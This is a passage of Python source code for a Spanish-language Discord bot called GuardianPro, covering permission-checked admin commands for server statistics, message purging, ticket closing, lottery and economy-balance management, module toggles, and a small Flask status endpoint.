                                 description="Otorgar permisos personalizados",
                                 emoji="🔐",
                                 value="permissions"),
            discord.SelectOption(
                label="📊 Ver Estado del Sistema",
                description="Estado del bot y configuraciones",
                emoji="📊",
                value="system_status"),
            discord.SelectOption(label="🔙 Volver al Menú Principal",
                                 description="Regresar al panel principal",
                                 emoji="🔙",
                                 value="back")
        ])
    async def select_utils_action(self, interaction: discord.Interaction,
                                  select: discord.ui.Select):
        if select.values[0] == "back":
            view = AdminMenuView()
            embed = discord.Embed(
                title="🛡️ Panel de Administración Completo",
                description="Selecciona una categoría administrativa:",
                color=discord.Color.red())
            await interaction.response.edit_message(embed=embed, view=view)
            return

        if select.values[0] == "system_status":
            await self.show_system_status(interaction)
        elif select.values[0] == "say_command":
            await self.show_say_command_info(interaction)
        elif select.values[0] == "permissions":
            await self.show_permissions_info(interaction)
        else:
            embed = discord.Embed(
                title="🛠️ Utilidades y Mantenimiento",
                description=
                f"Para usar esta función, utiliza los siguientes comandos:\n\n"
                f"**Limpiar mensajes:** `/purge [cantidad]`\n"
                f"**Gestionar módulos:** `/modules <módulo> <acción>`\n"
                f"**Ver miembros:** `/members`\n\n"
                f"**Ejemplo:** `/purge 50` para borrar 50 mensajes",
                color=discord.Color.orange())
            await interaction.response.edit_message(embed=embed, view=self)

    async def show_system_status(self, interaction):
        total_users = len(bot.users)
        total_guilds = len(bot.guilds)
        total_users_with_balance = len(balances)
        total_money_in_system = sum(data['wallet'] + data['bank']
                                    for data in balances.values())

        embed = discord.Embed(title="📊 Estado del Sistema GuardianPro",
                              color=discord.Color.green())
        embed.add_field(name="🤖 Estado del Bot",
                        value="🟢 En línea",
                        inline=True)
        embed.add_field(name="📊 Servidores", value=total_guilds, inline=True)
        embed.add_field(name="👥 Usuarios", value=total_users, inline=True)
        embed.add_field(name="💰 Usuarios con Balance",
                        value=total_users_with_balance,
                        inline=True)
        embed.add_field(name="💸 Dinero Total",
                        value=f"${total_money_in_system:,}",
                        inline=True)
        embed.add_field(name="🎫 Tickets Activos",
                        value=len(active_tickets),
                        inline=True)
        await interaction.response.edit_message(embed=embed, view=self)

    async def create_backup(self, interaction):
        embed = discord.Embed(
            title="💾 Respaldo Completado",
            description=
            "Se ha creado un respaldo simulado del servidor exitosamente.",
            color=discord.Color.green())
        embed.add_field(name="📁 Archivo",
                        value="`server_backup.zip` (simulado)",
                        inline=False)
        embed.add_field(
            name="🕒 Fecha",
            value=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            inline=False)
        await interaction.response.edit_message(embed=embed, view=self)

    async def show_say_command_info(self, interaction):
        embed = discord.Embed(
            title="💬 Comando Say",
            description="Hacer que el bot envíe mensajes personalizados:",
            color=discord.Color.blue())
        embed.add_field(name="📝 Uso",
                        value="`/say <mensaje> [canal]`\n\n"
                        "**Ejemplos:**\n"
                        "`/say Hola a todos!`\n"
                        "`/say Bienvenidos #general`",
                        inline=False)
        embed.add_field(
            name="🔒 Permisos",
            value=
            "Solo propietarios del servidor o usuarios con permisos especiales pueden usar este comando.",
            inline=False)
        await interaction.response.edit_message(embed=embed, view=self)

    async def show_permissions_info(self, interaction):
        embed = discord.Embed(
            title="🔐 Gestión de Permisos Especiales",
            description="Sistema de permisos personalizados del bot:",
            color=discord.Color.purple())
        embed.add_field(
            name="⚙️ Comandos",
            value="`/giveperms <@usuario/rol> <acción> <true/false>`\n"
            "`/viewperms [usuario/rol]` - Ver permisos\n\n"
            "**Acciones disponibles:**\n"
            "• `can_execute_commands` - Permite usar comandos especiales",
            inline=False)
        embed.add_field(name="💡 Ejemplos",
                        value="`/giveperms @Juan can_execute_commands true`\n"
                        "`/viewperms @Moderadores`",
                        inline=False)
        await interaction.response.edit_message(embed=embed, view=self)


# ================================
# COMANDO ADMINISTRATIVO /4dmin
# ================================


@bot.tree.command(name='4dmin', description='Panel de administración completo')
async def admin_menu(interaction: discord.Interaction):
    """Comando administrativo /4dmin con menús de selección"""
    # Verificar permisos de administrador
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    # Crear menú administrativo interactivo
    embed = discord.Embed(
        title="🛡️ Panel de Administración Completo",
        description="**Bienvenido al panel administrativo de GuardianPro**\n\n"
        "Selecciona una categoría del menú desplegable para acceder a las herramientas administrativas:\n\n"
        "📊 **Información y Estadísticas** - Ver datos del servidor\n"
        "💰 **Gestión de Economía** - Administrar dinero de usuarios\n"
        "🎫 **Sistema de Tickets** - Gestionar tickets y categorías\n"
        "🔧 **Configuración del Servidor** - Módulos y configuraciones\n"
        "🛠️ **Utilidades y Mantenimiento** - Herramientas de administración",
        color=discord.Color.red())
    embed.set_footer(
        text="Panel administrativo interactivo • Menús de selección")

    view = AdminMenuView()
    await interaction.response.send_message(embed=embed,
                                            view=view,
                                            ephemeral=True)


# ================================
# COMANDOS ADMINISTRATIVOS SLASH
# ================================


@bot.tree.command(name='admininfo',
                  description='Información administrativa del servidor')
async def admin_info(interaction: discord.Interaction):
    """Información administrativa del servidor"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    guild = interaction.guild
    embed = discord.Embed(title="🔧 Información Administrativa",
                          color=discord.Color.orange())

    embed.add_field(name="🏰 Servidor",
                    value=f"{guild.name}\nID: {guild.id}",
                    inline=True)
    embed.add_field(
        name="👑 Propietario",
        value=f"{guild.owner.mention if guild.owner else 'Desconocido'}",
        inline=True)
    embed.add_field(
        name="📊 Estado",
        value=f"Miembros: {guild.member_count}\nCanales: {len(guild.channels)}",
        inline=True)

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name='adminstats',
                  description='Estadísticas administrativas del servidor')
async def admin_stats(interaction: discord.Interaction):
    """Estadísticas administrativas"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    guild = interaction.guild
    embed = discord.Embed(title="📊 Estadísticas Administrativas",
                          color=discord.Color.blue())

    # Contar tipos de canales
    text_channels = len(
        [c for c in guild.channels if isinstance(c, discord.TextChannel)])
    voice_channels = len(
        [c for c in guild.channels if isinstance(c, discord.VoiceChannel)])

    embed.add_field(name="📝 Canales de texto",
                    value=text_channels,
                    inline=True)
    embed.add_field(name="🔊 Canales de voz", value=voice_channels, inline=True)
    embed.add_field(name="🏷️ Roles", value=len(guild.roles), inline=True)
    embed.add_field(name="🎫 Tickets activos",
                    value=len(active_tickets),
                    inline=True)
    embed.add_field(name="🎉 Sorteos activos",
                    value=len(active_giveaways),
                    inline=True)
    embed.add_field(name="💰 Usuarios con balance",
                    value=len(balances),
                    inline=True)

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name='config', description='Configuración del servidor')
async def admin_config(interaction: discord.Interaction):
    """Configuración del servidor"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    embed = discord.Embed(title="⚙️ Configuración del Servidor",
                          description="Comandos de configuración disponibles:",
                          color=discord.Color.green())

    embed.add_field(name="🛡️ Moderación",
                    value="`/automod` - Configurar moderación automática",
                    inline=False)
    embed.add_field(name="🎫 Tickets",
                    value="`/ticket_setup` - Configurar panel de tickets",
                    inline=False)
    embed.add_field(name="🎉 Entretenimiento",
                    value="`/gstart` - Crear sorteos",
                    inline=False)

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name='purge', description='Limpiar mensajes del canal')
@discord.app_commands.describe(
    amount="Cantidad de mensajes a eliminar (1-100)")
async def admin_purge(interaction: discord.Interaction, amount: int = 10):
    """Limpiar mensajes del canal"""
    if not interaction.user.guild_permissions.manage_messages:
        await interaction.response.send_message(
            "❌ No tienes permisos de administrar mensajes.", ephemeral=True)
        return

    if amount > 100:
        amount = 100

    await interaction.response.defer(ephemeral=True)

    try:
        deleted = await interaction.channel.purge(limit=amount)
        await interaction.followup.send(
            f"🗑️ Se eliminaron {len(deleted)} mensajes.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)


@bot.tree.command(name='closeall',
                  description='Cerrar todos los tickets abiertos')
async def admin_closeall(interaction: discord.Interaction):
    """Cerrar todos los tickets"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    guild = interaction.guild
    tickets_closed = 0

    for channel in guild.channels:
        if channel.name.startswith('ticket-'):
            try:
                await channel.delete()
                tickets_closed += 1
            except:
                pass

    # Limpiar registro de tickets activos
    active_tickets.clear()

    await interaction.followup.send(f"🎫 Se cerraron {tickets_closed} tickets.",
                                    ephemeral=True)


@bot.tree.command(name='winset', description='Configurar premio de la lotería')
@discord.app_commands.describe(reward="Premio de la lotería")
async def admin_winset(interaction: discord.Interaction, reward: str):
    """Configurar premio de la lotería"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    guild_id = str(interaction.guild.id)
    if guild_id not in lottery_settings:
        lottery_settings[guild_id] = {}

    lottery_settings[guild_id]['reward'] = reward
    save_lottery_settings()

    embed = discord.Embed(title="🎰 Premio de Lotería Configurado",
                          description=f"**Nuevo premio:** {reward}\n\n"
                          f"💰 **Costo para jugar:** $10,000\n"
                          f"🎯 **Probabilidad:** 0.5% (1/200)\n"
                          f"📝 **Comando:** `.win`",
                          color=discord.Color.gold())
    embed.set_footer(
        text="Los jugadores ahora pueden usar .win para participar")

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name='wininfo',
                  description='Ver información actual de la lotería')
async def admin_wininfo(interaction: discord.Interaction):
    """Ver información de la lotería"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    guild_id = str(interaction.guild.id)

    if guild_id not in lottery_settings or not lottery_settings[guild_id].get(
            'reward'):
        await interaction.response.send_message(
            "❌ No hay premio configurado. Usa `/winset <premio>` para configurar uno.",
            ephemeral=True)
        return

    reward = lottery_settings[guild_id]['reward']

    embed = discord.Embed(title="🎰 Información de Lotería",
                          color=discord.Color.blue())
    embed.add_field(name="🏆 Premio actual", value=reward, inline=False)
    embed.add_field(name="💰 Costo", value="$10,000", inline=True)
    embed.add_field(name="🎯 Probabilidad", value="0.5% (1/200)", inline=True)
    embed.add_field(name="📝 Comando", value="`.win`", inline=True)
    embed.set_footer(text="Configuración actual de la lotería")

    await interaction.response.send_message(embed=embed, ephemeral=True)


# ================================
# COMANDOS DE ECONOMÍA ADMINISTRATIVOS SLASH
# ================================


@bot.tree.command(name='eco', description='Añadir dinero a un usuario')
@discord.app_commands.describe(member="Usuario al que añadir dinero",
                               amount="Cantidad a añadir")
async def admin_eco(interaction: discord.Interaction, member: discord.Member,
                    amount: int):
    """Añadir dinero a usuarios (solo administradores)"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    if member.bot:
        await interaction.response.send_message(
            "❌ No puedes modificar el balance de un bot.", ephemeral=True)
        return

    if amount <= 0:
        await interaction.response.send_message(
            "❌ La cantidad debe ser mayor a 0.", ephemeral=True)
        return

    # Obtener balance actual
    current_balance = get_balance(member.id)

    # Aplicar adición
    update_balance(member.id, amount, 0)

    # Obtener nuevo balance
    new_balance = get_balance(member.id)

    # Crear embed de confirmación
    embed = discord.Embed(title="💸 Dinero Añadido",
                          color=discord.Color.green())
    embed.add_field(name="👤 Usuario", value=member.mention, inline=True)
    embed.add_field(name="💸 Cantidad añadida",
                    value=f"${amount:,}",
                    inline=True)
    embed.add_field(name="📊 Balance anterior",
                    value=f"${current_balance['wallet']:,}",
                    inline=True)
    embed.add_field(name="📈 Nuevo balance",
                    value=f"${new_balance['wallet']:,}",
                    inline=True)
    embed.set_footer(text=f"Modificado por {interaction.user.display_name}")

    await interaction.response.send_message(embed=embed, ephemeral=True)

    # Log del comando
    print(
        f"Comando /eco usado por {interaction.user.name}: +${amount:,} a {member.display_name}"
    )


@bot.tree.command(name='oce', description='Quitar dinero a un usuario')
@discord.app_commands.describe(member="Usuario al que quitar dinero",
                               amount="Cantidad a quitar")
async def admin_oce(interaction: discord.Interaction, member: discord.Member,
                    amount: int):
    """Quitar dinero a usuarios (solo administradores)"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    if member.bot:
        await interaction.response.send_message(
            "❌ No puedes modificar el balance de un bot.", ephemeral=True)
        return

    if amount <= 0:
        await interaction.response.send_message(
            "❌ La cantidad debe ser mayor a 0.", ephemeral=True)
        return

    # Obtener balance actual
    current_balance = get_balance(member.id)

    # Aplicar reducción (convertir a negativo)
    update_balance(member.id, -amount, 0)

    # Obtener nuevo balance
    new_balance = get_balance(member.id)

    # Crear embed de confirmación
    embed = discord.Embed(title="💸 Dinero Removido", color=discord.Color.red())
    embed.add_field(name="👤 Usuario", value=member.mention, inline=True)
    embed.add_field(name="💸 Cantidad removida",
                    value=f"${amount:,}",
                    inline=True)
    embed.add_field(name="📊 Balance anterior",
                    value=f"${current_balance['wallet']:,}",
                    inline=True)
    embed.add_field(name="📉 Nuevo balance",
                    value=f"${new_balance['wallet']:,}",
                    inline=True)
    embed.set_footer(text=f"Modificado por {interaction.user.display_name}")

    await interaction.response.send_message(embed=embed, ephemeral=True)

    # Log del comando
    print(
        f"Comando /oce usado por {interaction.user.name}: -${amount:,} a {member.display_name}"
    )


@bot.tree.command(name='ecoreset',
                  description='Resetear balance de usuario a $0')
@discord.app_commands.describe(member="Usuario al que resetear el balance")
async def admin_ecoreset(interaction: discord.Interaction,
                         member: discord.Member):
    """Resetear balance de usuario a 0 (solo administradores)"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    if member.bot:
        await interaction.response.send_message(
            "❌ No puedes modificar el balance de un bot.", ephemeral=True)
        return

    # Obtener balance actual
    current_balance = get_balance(member.id)
    current_total = current_balance['wallet'] + current_balance['bank']

    # Resetear completamente el balance
    user_id = str(member.id)
    balances[user_id] = {"wallet": 0, "bank": 0}
    save_balances()

    # Crear embed de confirmación
    embed = discord.Embed(title="🔄 Balance Reseteado",
                          color=discord.Color.orange())
    embed.add_field(name="👤 Usuario", value=member.mention, inline=True)
    embed.add_field(name="📊 Balance anterior",
                    value=f"${current_total:,}",
                    inline=True)
    embed.add_field(name="🔄 Nuevo balance", value="$0", inline=True)
    embed.add_field(name="💳 Billetera anterior",
                    value=f"${current_balance['wallet']:,}",
                    inline=True)
    embed.add_field(name="🏦 Banco anterior",
                    value=f"${current_balance['bank']:,}",
                    inline=True)
    embed.add_field(name="✅ Estado",
                    value="Completamente reseteado",
                    inline=True)
    embed.set_footer(text=f"Reseteado por {interaction.user.display_name}")

    await interaction.response.send_message(embed=embed, ephemeral=True)

    # Log del comando
    print(
        f"Comando /ecoreset usado por {interaction.user.name}: Balance de {member.display_name} reseteado (era ${current_total:,})"
    )


# ================================
# COMANDOS ADMINISTRATIVOS ADICIONALES SLASH
# ================================


@bot.tree.command(name='members',
                  description='Lista de miembros del servidor por estado')
async def admin_members(interaction: discord.Interaction):
    """Lista de miembros del servidor"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    guild = interaction.guild
    embed = discord.Embed(title=f"👥 Miembros de {guild.name}",
                          color=discord.Color.blue())

    # Contar miembros por estado
    online = len(
        [m for m in guild.members if m.status == discord.Status.online])
    idle = len([m for m in guild.members if m.status == discord.Status.idle])
    dnd = len([m for m in guild.members if m.status == discord.Status.dnd])
    offline = len(
        [m for m in guild.members if m.status == discord.Status.offline])
    bots = len([m for m in guild.members if m.bot])

    embed.add_field(name="🟢 En línea", value=online, inline=True)
    embed.add_field(name="🟡 Ausente", value=idle, inline=True)
    embed.add_field(name="🔴 No Molestar", value=dnd, inline=True)
    embed.add_field(name="⚪ Desconectado", value=offline, inline=True)
    embed.add_field(name="🤖 Bots", value=bots, inline=True)
    embed.add_field(name="👥 Total", value=guild.member_count, inline=True)

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name='tickets', description='Gestionar sistema de tickets')
async def admin_tickets(interaction: discord.Interaction):
    """Gestionar sistema de tickets"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    embed = discord.Embed(
        title="🎫 Gestión de Tickets",
        description="Comandos para administrar el sistema de tickets:",
        color=discord.Color.purple())
    embed.add_field(
        name="⚙️ Configuración",
        value="`/ticket_setup` - Configurar panel de tickets\n"
        "`/tadd <nombre> <descripción> [color]` - Añadir categoría\n"
        "`/tedit <id> [nombre] [descripción] [color]` - Editar categoría\n"
        "`/tremove <id>` - Eliminar categoría",
        inline=False)
    embed.add_field(
        name="📊 Administración",
        value="`/closeall` - Cerrar todos los tickets abiertos\n"
        "`/ticketlog <usuario>` - Ver historial de tickets de usuario",
        inline=False)

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name='ticketlog',
                  description='Ver historial de tickets de un usuario')
@discord.app_commands.describe(member="Usuario del que ver el historial")
async def admin_ticketlog(interaction: discord.Interaction,
                          member: discord.Member):
    """Ver historial de tickets de un usuario"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    # Simulación de historial de tickets
    history_embed = discord.Embed(
        title=f"📜 Historial de Tickets de {member.display_name}",
        color=discord.Color.blue())
    history_embed.add_field(name="ID Ticket",
                            value="`ticket-general-12345`",
                            inline=True)
    history_embed.add_field(name="Estado", value="✅ Cerrado", inline=True)
    history_embed.add_field(name="Fecha Creación",
                            value="Hace 2 días",
                            inline=True)
    history_embed.add_field(name="---", value="---", inline=False)
    history_embed.add_field(name="ID Ticket",
                            value="`ticket-bugs-67890`",
                            inline=True)
    history_embed.add_field(name="Estado", value="❌ Abierto", inline=True)
    history_embed.add_field(name="Fecha Creación",
                            value="Hace 1 hora",
                            inline=True)
    history_embed.set_footer(
        text=f"Consultado por {interaction.user.display_name}")

    await interaction.response.send_message(embed=history_embed,
                                            ephemeral=True)


@bot.tree.command(name='welcome',
                  description='Configurar mensajes de bienvenida')
async def admin_welcome(interaction: discord.Interaction):
    """Configurar mensajes de bienvenida"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    embed = discord.Embed(
        title="👋 Configuración de Bienvenida",
        description="Comandos para gestionar los mensajes de bienvenida:",
        color=discord.Color.teal())
    embed.add_field(
        name="🔧 Configurar",
        value="`/set_welcome_channel <canal>` - Establecer canal de bienvenida\n"
        "`/set_welcome_message <mensaje>` - Definir mensaje de bienvenida\n"
        "`/toggle_welcome <true/false>` - Activar/desactivar bienvenidas",
        inline=False)
    embed.add_field(name="💡 Variables del mensaje",
                    value="`{user}` - Menciona al nuevo usuario\n"
                    "`{username}` - Nombre de usuario\n"
                    "`{server}` - Nombre del servidor",
                    inline=False)

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name='modules',
                  description='Activar/desactivar módulos del bot')
@discord.app_commands.describe(module="Módulo a gestionar",
                               action="Acción a realizar")
@discord.app_commands.choices(
    module=[
        discord.app_commands.Choice(name="Economía", value="economy"),
        discord.app_commands.Choice(name="Sistema de Niveles", value="levels"),
        discord.app_commands.Choice(name="Tickets", value="tickets"),
        discord.app_commands.Choice(name="Automod", value="automod"),
        discord.app_commands.Choice(name="Sorteos", value="giveaways"),
        discord.app_commands.Choice(name="Entretenimiento",
                                    value="entertainment")
    ],
    action=[
        discord.app_commands.Choice(name="Activar", value="enable"),
        discord.app_commands.Choice(name="Desactivar", value="disable"),
        discord.app_commands.Choice(name="Ver Estado", value="status")
    ])
async def modules_command(interaction: discord.Interaction, module: str,
                          action: str):
    """Gestionar módulos del bot"""
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "❌ Este comando es solo para administradores.", ephemeral=True)
        return

    if action == "status":
        embed = discord.Embed(
            title="⚙️ Estado de Módulos",
            description="Estado actual de todos los módulos:",
            color=discord.Color.blue())

        module_names = {
            'economy': '💰 Sistema de Economía',
            'levels': '🏆 Sistema de Niveles',
            'tickets': '🎫 Sistema de Tickets',
            'automod': '🛡️ Moderación Automática',
            'giveaways': '🎉 Sorteos',
            'entertainment': '🎮 Entretenimiento'
        }

        for mod_key, mod_name in module_names.items():
            status = "✅ Activado" if system_modules.get(
                mod_key, True) else "❌ Desactivado"
            embed.add_field(name=mod_name, value=status, inline=True)

        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    # Cambiar estado del módulo
    if action == "enable":
        system_modules[module] = True
        status_text = "✅ Activado"
        color = discord.Color.green()
    else:  # disable
        system_modules[module] = False
        status_text = "❌ Desactivado"
        color = discord.Color.red()

    module_names = {
        'economy': '💰 Sistema de Economía',
        'levels': '🏆 Sistema de Niveles',
        'tickets': '🎫 Sistema de Tickets',
        'automod': '🛡️ Moderación Automática',
        'giveaways': '🎉 Sorteos',
        'entertainment': '🎮 Entretenimiento'
    }

    embed = discord.Embed(
        title="⚙️ Módulo Actualizado",
        description=
        f"**{module_names.get(module, module.title())}** ha sido {status_text.lower()}",
        color=color)
    embed.add_field(name="📊 Nuevo Estado", value=status_text, inline=True)
    embed.set_footer(text=f"Modificado por {interaction.user.display_name}")

    await interaction.response.send_message(embed=embed, ephemeral=True)


# Configurar Flask
app = Flask(__name__)


@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "bot": "GuardianPro",
        "version": "GPC 4",
        "servers": len(bot.guilds),
        "users": len(bot.users)
    })


@app.route('/status')
def status():
    return jsonify({
        "bot_ready": bot.is_ready(),
        "latency": round(bot.latency * 1000, 2),
        "guilds": len(bot.guilds),
        "users": len(bot.users),
        "economy_mode": economy_only_mode,
        "delta_commands": delta_commands_enabled
    })


def run_flask():
    app.run(host='0.0.0.0', port=8080, debug=False)


if __name__ == "__main__":
    token = os.getenv('DISCORD_TOKEN')
    if not token:
        print(
            "❌ Error: DISCORD_TOKEN no encontrado en las variables de entorno")
        print("Agrega tu token de Discord en la sección Secrets")
        exit(1)

    # Iniciar Flask en un hilo separado
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("🌐 Servidor Flask iniciado en http://0.0.0.0:8080")

    try:
        bot.run(token)
    except Exception as e:
        print(f"❌ Error al iniciar el bot: {e}")
        exit(1)
